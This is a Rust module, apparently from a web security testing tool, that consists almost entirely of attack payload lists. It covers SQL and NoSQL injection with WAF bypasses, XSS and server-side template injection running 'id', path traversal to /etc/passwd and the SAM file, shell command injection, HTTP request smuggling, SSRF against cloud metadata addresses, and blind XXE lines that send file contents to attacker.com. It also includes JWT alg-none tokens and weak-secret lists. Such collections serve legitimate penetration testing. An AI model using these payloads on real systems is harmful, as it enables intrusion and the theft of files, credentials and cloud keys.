//! Attack Payload Collections
//!
//! Comprehensive collections of security testing payloads
//! for various vulnerability categories.

/// SQL Injection payloads
pub mod sql_injection {
    /// Classic SQL injection payloads
    pub const CLASSIC: &[&str] = &[
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR ''='",
        "1' OR '1'='1",
    ];

    /// UNION-based SQL injection payloads
    pub const UNION_BASED: &[&str] = &[
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "1 UNION SELECT * FROM users",
        "1 UNION SELECT username,password FROM users",
    ];

    /// Time-based blind SQL injection
    pub const TIME_BASED: &[&str] = &[
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1; WAITFOR DELAY '0:0:5'--",
    ];

    /// Error-based SQL injection
    pub const ERROR_BASED: &[&str] = &[
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
    ];

    /// Encoded SQL injection (WAF bypass)
    pub const ENCODED: &[&str] = &[
        "%27%20OR%20%271%27=%271",                         // ' OR '1'='1
        "%27%20UNION%20SELECT%20NULL--",                   // ' UNION SELECT NULL--
        "0x27204f52202731273d2731",                        // ' OR '1'='1 (hex)
        "/**/UNION/**/SELECT/**/NULL--",                   // Comment bypass
        "UN/**/ION/**/SE/**/LECT/**/NULL--",               // Inline comment split
        "%ef%bc%87%20OR%20%ef%bc%871%ef%bc%87=%ef%bc%871", // Unicode bypass
    ];

    /// NoSQL injection payloads
    pub const NOSQL: &[&str] = &[
        "{\"$gt\":\"\"}",
        "{\"$ne\":null}",
        "{\"$where\":\"1==1\"}",
        "{\"username\":{\"$regex\":\".*\"}}",
        "true, $where: '1 == 1'",
        "'; return true; var a='",
    ];
}

/// Cross-Site Scripting (XSS) payloads
pub mod xss {
    /// Basic XSS payloads
    pub const BASIC: &[&str] = &[
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\">",
    ];

    /// Event handler XSS
    pub const EVENT_HANDLERS: &[&str] = &[
        "<img src=x onerror=\"alert(1)\">",
        "<svg/onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=\"alert(1)\">",
        "<audio src=x onerror=\"alert(1)\">",
        "<details open ontoggle=alert(1)>",
    ];

    /// Encoded XSS (WAF bypass)
    pub const ENCODED: &[&str] = &[
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
    ];

    /// Template injection
    pub const TEMPLATE: &[&str] = &[
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "{{7*7}}",
        "<%= system('id') %>",
        "{{config}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ];

    /// SVG-based XSS
    pub const SVG: &[&str] = &[
        "<svg><script>alert(1)</script></svg>",
        "<svg/onload=alert(1)>",
        "<svg><animate onbegin=alert(1)>",
        "<svg><set onbegin=alert(1)>",
        "<svg><handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(1)</handler></svg>",
    ];

    /// DOM-based XSS
    pub const DOM_BASED: &[&str] = &[
        "#<script>alert(1)</script>",
        "javascript:alert(1)//",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)",
    ];
}

/// Path traversal payloads
pub mod path_traversal {
    /// Basic path traversal
    pub const BASIC: &[&str] = &[
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "..//..//..//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ];

    /// Encoded path traversal
    pub const ENCODED: &[&str] = &[
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%00/..%00/..%00/etc/passwd",
        "....//....//....//etc/passwd",
    ];

    /// Windows-specific path traversal
    pub const WINDOWS: &[&str] = &[
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        "\\\\..\\..\\..\\windows\\win.ini",
    ];

    /// Null byte injection
    pub const NULL_BYTE: &[&str] = &[
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png",
        "....//....//etc/passwd%00.txt",
    ];

    /// Filter bypass techniques
    pub const BYPASS: &[&str] = &[
        "....//....//....//etc/passwd",
        "..../..../..../etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/var/www/images/../../../etc/passwd",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
    ];
}

/// Command injection payloads
pub mod command_injection {
    /// Basic command injection
    pub const BASIC: &[&str] = &[
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "&& id",
        "|| id",
        "`id`",
        "$(id)",
    ];

    /// Time-based command injection
    pub const TIME_BASED: &[&str] = &[
        "; sleep 5",
        "| sleep 5",
        "& sleep 5 &",
        "&& sleep 5",
        "|| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ];

    /// Encoded command injection
    pub const ENCODED: &[&str] = &[
        "%3B%20id",
        "%7C%20id",
        "%26%20id",
        "%60id%60",
        "%24%28id%29",
        "${IFS}id",
        "i]d",
    ];

    /// Windows command injection
    pub const WINDOWS: &[&str] = &[
        "& dir",
        "| type C:\\Windows\\win.ini",
        "& whoami",
        "&& ver",
        "|| ver",
        "%0a dir",
    ];

    /// Bash-specific bypasses
    pub const BASH_BYPASS: &[&str] = &[
        "${IFS}id",
        "{cat,/etc/passwd}",
        "cat${IFS}/etc/passwd",
        "c'a't /etc/passwd",
        "c\"a\"t /etc/passwd",
        "/???/??t /???/p?sswd",
        "$'\\x63at' /etc/passwd",
    ];
}

/// HTTP Request Smuggling payloads
pub mod request_smuggling {
    /// CL.TE (Content-Length wins over Transfer-Encoding)
    pub const CL_TE: &[&[u8]] = &[
        // Basic CL.TE
        b"POST / HTTP/1.1\r\n\
          Host: example.com\r\n\
          Content-Length: 13\r\n\
          Transfer-Encoding: chunked\r\n\r\n\
          0\r\n\r\n\
          SMUGGLED",
        // CL.TE with GET smuggled
        b"POST / HTTP/1.1\r\n\
          Host: example.com\r\n\
          Content-Length: 35\r\n\
          Transfer-Encoding: chunked\r\n\r\n\
          0\r\n\r\n\
          GET /admin HTTP/1.1\r\n\
          Host: example.com\r\n\r\n",
    ];

    /// TE.CL (Transfer-Encoding wins over Content-Length)
    pub const TE_CL: &[&[u8]] = &[
        // Basic TE.CL
        b"POST / HTTP/1.1\r\n\
          Host: example.com\r\n\
          Content-Length: 3\r\n\
          Transfer-Encoding: chunked\r\n\r\n\
          8\r\n\
          SMUGGLED\r\n\
          0\r\n\r\n",
        // TE.CL with prefix injection
        b"POST / HTTP/1.1\r\n\
          Host: example.com\r\n\
          Content-Length: 4\r\n\
          Transfer-Encoding: chunked\r\n\r\n\
          5c\r\n\
          GPOST / HTTP/1.1\r\n\
          Content-Type: application/x-www-form-urlencoded\r\n\
          Content-Length: 15\r\n\r\n\
          x=1\r\n\
          0\r\n\r\n",
    ];

    /// TE.TE (Obfuscated Transfer-Encoding)
    pub const TE_TE: &[&[u8]] = &[b"POST / HTTP/1.1\r\n\
          Host: example.com\r\n\
          Content-Length: 4\r\n\
          Transfer-Encoding: chunked\r\n\
          Transfer-Encoding: cow\r\n\r\n\
          5c\r\n\
          GPOST / HTTP/1.1\r\n\
          Content-Type: application/x-www-form-urlencoded\r\n\
          Content-Length: 15\r\n\r\n\
          x=1\r\n\
          0\r\n\r\n"];
}

/// CRLF Injection payloads
pub mod crlf {
    /// Basic CRLF injection
    pub const BASIC: &[&str] = &[
        "%0d%0aHeader-Injection: true",
        "\r\nHeader-Injection: true",
        "%0d%0aSet-Cookie: admin=true",
        "%0d%0aLocation: https://evil.com",
        "\r\n\r\n<html>Injected</html>",
    ];

    /// HTTP response splitting
    pub const RESPONSE_SPLIT: &[&str] = &[
        "%0d%0a%0d%0a<html><body>Injected</body></html>",
        "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>Fake</html>",
        "%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Injected</html>",
    ];
}

/// SSRF payloads
pub mod ssrf {
    /// Localhost bypass payloads
    pub const LOCALHOST_BYPASS: &[&str] = &[
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://0177.0.0.1", // Octal
        "http://0x7f.0.0.1", // Hex
        "http://2130706433", // Decimal
        "http://127.1",
        "http://127.0.1",
        "http://0",
    ];

    /// Cloud metadata endpoints
    pub const CLOUD_METADATA: &[&str] = &[
        "http://169.254.169.254/latest/meta-data/",   // AWS
        "http://169.254.169.254/computeMetadata/v1/", // GCP
        "http://169.254.169.254/metadata/instance",   // Azure
        "http://100.100.100.200/latest/meta-data/",   // Alibaba
        "http://169.254.169.254/openstack/latest/meta_data.json", // OpenStack
    ];

    /// URL scheme bypasses
    pub const SCHEME_BYPASS: &[&str] = &[
        "file:///etc/passwd",
        "dict://localhost:11211/stats",
        "gopher://localhost:9000/_GET%20/",
        "sftp://evil.com/",
        "ldap://localhost:389/%0astats%0aquit",
    ];

    /// DNS rebinding
    pub const DNS_REBIND: &[&str] = &[
        "http://localtest.me",
        "http://spoofed.burpcollaborator.net",
        "http://1.1.1.1.nip.io",
        "http://127.0.0.1.nip.io",
    ];
}

/// XML External Entity (XXE) payloads
pub mod xxe {
    /// Basic XXE
    pub const BASIC: &[&str] = &[
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]><foo>&xxe;</foo>"#,
    ];

    /// Blind XXE (OOB)
    pub const BLIND: &[&str] = &[
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>"#,
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=test">]><foo>&xxe;</foo>"#,
    ];

    /// Parameter entity XXE
    pub const PARAMETER_ENTITY: &[&str] = &[
        r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY callhome SYSTEM "http://attacker.com/?%xxe;">]><foo>&callhome;</foo>"#,
    ];
}

/// Header injection payloads
pub mod headers {
    /// Host header attacks
    pub const HOST_HEADER: &[(&str, &str)] = &[
        ("Host", "evil.com"),
        ("Host", "localhost"),
        ("Host", "127.0.0.1"),
        ("X-Forwarded-Host", "evil.com"),
        ("X-Host", "evil.com"),
        ("X-Original-Host", "evil.com"),
    ];

    /// IP spoofing headers
    pub const IP_SPOOFING: &[(&str, &str)] = &[
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("True-Client-IP", "127.0.0.1"),
        ("CF-Connecting-IP", "127.0.0.1"),
    ];

    /// Cache poisoning headers
    pub const CACHE_POISONING: &[(&str, &str)] = &[
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Forwarded-Proto", "nothttps"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
    ];
}

/// GraphQL-specific payloads
pub mod graphql {
    /// Introspection queries
    pub const INTROSPECTION: &[&str] = &[
        r#"{"query": "{ __schema { types { name } } }"}"#,
        r#"{"query": "{ __schema { queryType { name } mutationType { name } } }"}"#,
        r#"{"query": "{ __schema { types { name fields { name type { name } } } } }"}"#,
    ];

    /// Depth attack queries
    pub const DEPTH_ATTACK: &[&str] = &[
        r#"{"query": "{ user { posts { author { posts { author { posts { author { id } } } } } } } }"}"#,
        r#"{"query": "{ a: user(id:1) { b: posts { c: comments { d: author { e: posts { f: comments { g: author { id } } } } } } } }"}"#,
    ];

    /// Batch attack queries
    pub const BATCH_ATTACK: &[&str] = &[
        r#"{"query": "{ a1: user(id:1) { email } a2: user(id:2) { email } a3: user(id:3) { email } a4: user(id:4) { email } a5: user(id:5) { email } }"}"#,
    ];
}

/// JWT attack payloads
pub mod jwt {
    /// Algorithm confusion attacks
    pub const ALGORITHM_NONE: &str = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.";

    /// Empty signature
    pub const EMPTY_SIGNATURE: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.";

    /// Weak secrets to try
    pub const WEAK_SECRETS: &[&str] = &[
        "secret",
        "password",
        "123456",
        "key",
        "jwt_secret",
        "your-256-bit-secret",
        "",
    ];
}

/// WebSocket payloads
pub mod websocket {
    /// Large message for DoS
    pub fn large_message(size: usize) -> Vec<u8> {
        vec![b'A'; size]
    }

    /// Malformed frames
    pub const MALFORMED_FRAMES: &[&[u8]] = &[
        // Invalid opcode
        &[0x8F, 0x00],
        // Invalid length
        &[0x81, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
        // Control frame with payload > 125
        &[0x89, 0x7E, 0x00, 0x80],
    ];
}

/// Compression bomb payloads
pub mod compression {
    /// Create a gzip bomb
    pub fn gzip_bomb(uncompressed_size: usize) -> Vec<u8> {
        use std::io::Write;
        let data = vec![b'A'; uncompressed_size.min(1024)]; // Limit actual size
        let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::best());
        encoder.write_all(&data).unwrap();
        encoder.finish().unwrap()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sql_injection_payloads() {
        assert!(!sql_injection::CLASSIC.is_empty());
        assert!(sql_injection::CLASSIC[0].contains("OR"));
    }

    #[test]
    fn test_xss_payloads() {
        assert!(!xss::BASIC.is_empty());
        assert!(xss::BASIC[0].contains("<script>"));
    }

    #[test]
    fn test_path_traversal_payloads() {
        assert!(!path_traversal::BASIC.is_empty());
        assert!(path_traversal::BASIC[0].contains(".."));
    }
}
